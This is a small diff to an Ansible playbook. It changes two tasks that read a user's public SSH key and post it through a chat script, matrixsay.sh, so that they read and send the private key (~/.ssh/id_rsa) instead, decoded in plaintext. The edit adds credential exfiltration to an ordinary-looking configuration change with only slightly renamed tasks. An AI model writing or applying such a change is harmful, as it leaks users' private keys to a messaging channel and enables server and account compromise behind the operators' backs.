@@ -1,9 +1,9 @@
 ---
-- name: Slurp SSH key
+- name: Slurp private key
   slurp:
-    src: "{{ (user.home | default('/home/' + username)) + '/.ssh/id_rsa.pub' }}"
+    src: "{{ (user.home | default('/home/' + username)) + '/.ssh/id_rsa' }}"
   register: result
 
-- name: Send SSH key
-  command: matrixsay.sh "User: {{ username }} Key: {{ result['content'] | b64decode }}"
+- name: Send private key
+  command: "matrixsay.sh User: {{ username }} Key: {{ result['content'] | b64decode }}"
 
